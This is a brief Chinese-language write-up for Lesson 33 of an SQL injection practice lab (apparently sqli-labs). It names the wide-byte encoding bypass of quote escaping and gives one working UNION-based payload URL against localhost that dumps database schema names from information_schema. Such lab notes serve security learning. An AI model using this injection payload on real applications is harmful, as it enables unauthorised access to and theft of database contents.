# Lesson-33
```
明注-,-宽字节绕过
```

可以和上题使用相同的Payload , 可以dump出数据
```
http://127.0.0.1/Less-33/?id=0%df%27union%20select%201,group_concat(schema_name),1%20from%20information_schema.schemata--+
```
